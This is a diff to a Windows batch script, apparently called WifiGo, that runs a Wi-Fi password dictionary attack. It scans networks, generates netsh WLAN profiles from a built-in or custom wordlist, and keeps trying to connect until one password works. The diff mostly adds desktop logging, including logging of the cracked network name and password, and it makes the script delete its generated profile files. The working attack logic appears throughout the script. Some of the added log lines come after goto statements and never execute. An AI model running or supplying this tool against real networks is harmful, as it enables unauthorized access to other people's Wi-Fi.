@@ -2,13 +2,32 @@
 :: This Sets The console Window to fit the Script Output
 :Setting_Screen
     mode 66,33
+    echo WifiGo Log File Date : %date% > %userprofile%\desktop\WifiGo-log.txt
+    echo ============================================================================== >> %userprofile%\desktop\WifiGo-log.txt
+    echo. >> %userprofile%\desktop\WifiGo-log.txt
+    echo %time% : Setting The Console Window done. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
+
 :: Requirements bulding the needed directories
 :Requirements
+    echo %time% : Creating WiFiGo Temp Folder done. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
     mkdir %temp%\WifiGo
+    echo %time% : Creating TMP Temp Folder done. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
     mkdir %temp%\WifiGo\TMP
+    echo %time% : Creating SUB Temp Folder done. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
     mkdir %temp%\WifiGo\TMP\SUB
-    set theMain=%temp%\WifiGo\         
+    set theMain=%temp%\WifiGo\
+    echo %time% : Setting WifiGo folder Path done. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
+    mkdir %temp%\WifiGo\TMP\SUB
+    echo %time% : Setting TMP folder Path done. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt    
     set theTmp=%temp%\WifiGo\TMP\
+    echo %time% : Setting SUB folder Path done. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
     set theSub=%temp%\WifiGo\TMP\SUB\
 :: Welcome screen and Software usage
 :Welcom
@@ -38,7 +57,8 @@
     echo     [S] Scan Available Networks
     echo     [Q] Quit
     echo.
-
+    echo %time% : Showing Welcom Screen done. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
 :: Setting User Input and Checking Validity Then Goto Choice:
 :User
     setlocal
@@ -47,30 +67,40 @@
     :Check_quit
     if "%Choice%"=="q" (
           goto :End
+          echo %time% : User Quit. >> %userprofile%\desktop\WifiGo-log.txt
+          echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
     ) else (
         goto :Check_quit_Upper
     )
     :Check_quit_Upper 
     if "%Choice%"=="Q" ( 
             goto :End
+            echo %time% : User Quit. >> %userprofile%\desktop\WifiGo-log.txt
+            echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
     ) else (
        goto :Check_Scan
     )
     :Check_Scan
     if "%Choice%"=="s" (
           goto :Scan_Networks
+          echo %time% : User Selectet Scan Mode. >> %userprofile%\desktop\WifiGo-log.txt
+          echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
     ) else (
         goto :Check_quit_Upper
     )
     :Check_quit_Upper 
     if "%Choice%"=="S" ( 
             goto :Scan_Networks
+            echo %time% : User Selectet Scan Mode. >> %userprofile%\desktop\WifiGo-log.txt
+            echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
     ) else (
        echo.
        echo -----------------------------------------
        echo Please Select From Options Only { S / Q }
        echo -----------------------------------------
        echo.
+       echo %time% : User Input Not Allowed ! " %Choice% ". >> %userprofile%\desktop\WifiGo-log.txt
+       echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
        goto :User
     )
     endlocal
@@ -91,6 +121,8 @@
         set /p n=<%theTmp%cou.tmp
         del %theTmp%cou.tmp
         if "%n%"=="0" (
+         echo %time% : No Available Networks Where Found or Adapter Down. >> %userprofile%\desktop\WifiGo-log.txt
+         echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
            goto :Brake
         ) else (
         echo Networks Available :
@@ -140,15 +172,17 @@
              for /F "skip=1 tokens=2" %%a in ('fc /B chr.tmp zero.tmp') do set "hex=!hex!%%a"
              del chr.tmp zero.tmp
              endlocal & set "%~1=%hex%" & SET "hex=%hex%"
+             echo %time% : Network name %SNN% and HEX Value %hex%. >> %userprofile%\desktop\WifiGo-log.txt
+             echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
              goto :eof
       
        :Setup
+             echo %time% : Converting User Selectet Network Name to HEX done. >> %userprofile%\desktop\WifiGo-log.txt
+             echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
              echo.
              echo.
              set /p SNN=Paste Here :
              call :Convert "%SNN%"
-
-
 
 :: Profile Settings Function Just Display The Settings For The user
 :: And Offer to select a Built in Wordlist Or Custom List
@@ -178,24 +212,32 @@
         :Check_Choice_2
            :case_1_2
               if "%choice_2%"=="1" (
+                 echo %time% : User Selected Built-in Mode. >> %userprofile%\desktop\WifiGo-log.txt
+                 echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
                  goto :Built_In_List
               ) else (
                  goto :case_2_2
               )
            :case_2_2
               if "%choice_2%"=="2" (
+                 echo %time% : User Selected Custom List Mode. >> %userprofile%\desktop\WifiGo-log.txt
+                 echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
                  goto :Custom_List
               ) else (
                  goto :case_3_2
               )
            :case_3_2
               if "%choice_2%"=="q" (
+              echo %time% : User Quit. >> %userprofile%\desktop\WifiGo-log.txt
+              echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
               goto :End
               ) else (
                   goto :Check_quit_Upper
               )
               :Check_quit_Upper 
               if "%choice_2%"=="Q" ( 
+                  echo %time% : User Quit. >> %userprofile%\desktop\WifiGo-log.txt
+                  echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
                   goto :End
               ) else (
                   echo.
@@ -225,6 +267,8 @@
        echo.
        echo          Built-In WordList Is Generated Succesfully !
        echo.
+       echo %time% : Built-in Mode WordList Generated Successfilly. >> %userprofile%\desktop\WifiGo-log.txt
+       echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
        set wordlist=%theTmp%wordlist.tmp
        goto :main
     endlocal
@@ -271,12 +315,16 @@
      rem check if quit an other abort if statment to quit from this point 
     :Check_If_Quit 
        if "%UserPath%"=="q" (
+             echo %time% : User Quit. >> %userprofile%\desktop\WifiGo-log.txt
+             echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
              goto :End
        ) else (
            goto :Check_quit_Upper
        )
        :Check_quit_Upper 
        if "%UserPath%"=="Q" ( 
+               echo %time% : User Quit. >> %userprofile%\desktop\WifiGo-log.txt
+               echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
                goto :End
        ) else (
           goto :User_Dec_Check
@@ -305,6 +353,8 @@
              echo.
              echo                     Or Type " Q / q " To Quit
              echo.
+             echo %time% : User Provided Path Not Valid. >> %userprofile%\desktop\WifiGo-log.txt
+             echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
              goto :User_Path_Input
        ) else (
              cls
@@ -323,9 +373,15 @@
              echo.
              echo                 Initilizing Dectiunary Attack ...
              echo.
-             copy %UserPath% %temp%\WifiGo\TMP\wordlist.tmp >nul
+             echo %time% : Validation Completed Successfully. >> %userprofile%\desktop\WifiGo-log.txt
+             echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
+             echo %time% : Copying User Wordlist. >> %userprofile%\desktop\WifiGo-log.txt
+             copy %UserPath% %temp%\WifiGo\TMP\wordlist.tmp >> %userprofile%\desktop\WifiGo-log.txt
+             echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
              timeout /t 2 /nobreak >nul
              set wordlist=%temp%\WifiGo\TMP\wordlist.tmp
+             echo %time% : Preparing List To Attack. >> %userprofile%\desktop\WifiGo-log.txt
+             echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
              goto :main
        )
     endlocal  
@@ -337,6 +393,8 @@
     rem correct password for the network.
 
        rem This is the template fill loop, use network name and hex value and  one word at the time
+    echo %time% : Starting Attack. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
     :loop
         for /f %%i in (%wordlist%) do (
         rem This is the Profile Template To Use  :Starts Here:
@@ -372,7 +430,7 @@
         rem This is the Profile Template To Use  :Ends Here:
         rem This Will Add The Profile And Connect To It 
               netsh wlan add profile filename=%temp%\WifiGo\WiFi-%SNN2%.xml interface="WiFi" >nul
-             rem del %temp%\WifiGo\WiFi-%SNN2%.xml >nul
+              del %temp%\WifiGo\WiFi-%SNN2%.xml >nul
               netsh wlan connect SSID=%SNN2% name=%SNN2% >nul
               timeout /t 2 >nul
     
@@ -435,6 +493,8 @@
              echo                *********************************
              echo.
              echo.
+             echo %time% : No Valid Password Found In word list Attack Failed. >> %userprofile%\desktop\WifiGo-log.txt
+             echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
              timeout /t 5 /nobreak >nul
          goto :End
        ) else (
@@ -471,6 +531,9 @@
              echo.
              echo.
              echo.
+             echo %time% : Correct Password Found. >> %userprofile%\desktop\WifiGo-log.txt
+             echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
+             echo %time% : Connected to [ %SNN% ] Successfully. >> %userprofile%\desktop\WifiGo-log.txt
              goto :Success
           ) else (
              netsh wlan disconnect
@@ -482,12 +545,16 @@
     Set /p Save2txt=Do You Want To Save it To File (Y/N) ?
        :Save2txt_check_Yes
           if "%Save2txt%"=="y" (
+                echo %time% : User Select To Save To File. >> %userprofile%\desktop\WifiGo-log.txt
+                echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
                 goto :Save2txtFunc
           ) else (
               goto :Check_Save_Upper_Yes
           )
           :Check_Save_Upper_Yes 
           if "%Save2txt%"=="Y" ( 
+                  echo %time% : User Select To Save To File. >> %userprofile%\desktop\WifiGo-log.txt
+                  echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
                   goto :Save2txtFunc
           ) else (
              goto :Save2txt_check_No
@@ -504,10 +571,18 @@
              ) else (
                 echo.
                 echo Invalid Input, Please Type [Y/N] Only !
+                echo %time% : User Input Invalid %Savettxt% Not Allowed. >> %userprofile%\desktop\WifiGo-log.txt
+                echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
                 goto :Success
              )
+
+:: This Function Deletes All Temporary files and Folders
 :Cleaning
+    echo %time% : Deleting Temporary Files and Folders. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
     rmdir /s /q %temp%\WifiGo
+    echo %time% : Deleting Done. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
  goto :Ending
 
 :: save to text function just prints its output to a textfile on Desktop
@@ -529,6 +604,8 @@
     echo.                                                                   >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
     echo.                                                                   >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
     echo ****************************************************************** >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo %time% : Saving Output To Desktop done File Name WiFiGo-%SNN%.txt. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
     goto:Cleaning
 
 :: Ending Function, Shows the crached password for the last time 
@@ -563,6 +640,8 @@
     echo.
     echo.
     echo.
+    echo %time% : Showing Final Window done [ Name=%SNN% - Pass=%pass% ]. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
     endlocal
     goto :eof
 :: End Function is the goodbay screen 
@@ -595,5 +674,11 @@
     echo.
     echo.
     timeout /t 3 >nul
+    echo %time% : All Done Script Ended Correctly. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
+    echo %time% : Deleting Temporary Files and Folders. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
     rmdir /s /q %temp%\WifiGo
+    echo %time% : Deleting done. >> %userprofile%\desktop\WifiGo-log.txt
+    echo ------------------------------------------------------------------------------ >> %userprofile%\desktop\WifiGo-log.txt
     goto :eof
